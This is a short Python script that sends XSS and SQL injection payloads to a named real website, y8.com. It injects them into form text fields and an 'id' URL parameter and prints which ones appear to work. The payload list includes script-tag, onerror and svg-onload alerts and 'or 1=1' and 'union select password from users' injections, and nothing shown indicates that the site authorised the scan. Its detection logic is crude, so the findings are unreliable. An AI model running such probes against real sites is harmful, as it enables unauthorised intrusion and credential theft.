import requests
from bs4 import BeautifulSoup

# The target website to scan
url = "https://www.y8.com"

# A list of common vulnerability payloads to test
payloads = [
    "<script>alert('XSS')</script>",
    "<img src='notfound.gif' onerror='alert(\"XSS\")'/>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<svg onload='alert(\"XSS\")'/>",
    "' or 1=1;--",
    "' or 1=1 #",
    "' union select 1,2,3 --",
    "' union select password from users --"
]

# Send GET request to the target website
response = requests.get(url)

# Parse the HTML content using Beautiful Soup
soup = BeautifulSoup(response.content, "html.parser")

# Check for XSS vulnerabilities by injecting payloads into input fields and checking if they are executed
forms = soup.find_all("form")
for form in forms:
    inputs = form.find_all("input")
    for input in inputs:
        if input.get("type") == "text":
            # Inject the payloads into the input field
            for payload in payloads:
                data = {input.get("name"): payload}
                # Send the POST request with the injected payload
                response = requests.post(url, data=data)
                # Check if the payload was executed
                if payload in response.text:
                    print(f"XSS vulnerability found in {url} with payload {payload}")
                else:
                    print(f"No XSS vulnerabilities found with payload {payload}.")
                    
# Check for SQL injection vulnerabilities by injecting payloads into URL parameters and checking for SQL errors
for payload in payloads:
    # Inject the payload into the URL parameter
    url_with_payload = f"{url}?id={payload}"
    # Send the GET request with the injected payload
    response = requests.get(url_with_payload)
    # Check if a SQL error was returned
    if "SQL syntax" in response.text:
        print(f"SQL injection vulnerability found in {url} with payload {payload}")
    else:
        print(f"No SQL injection vulnerabilities found with payload {payload}.")
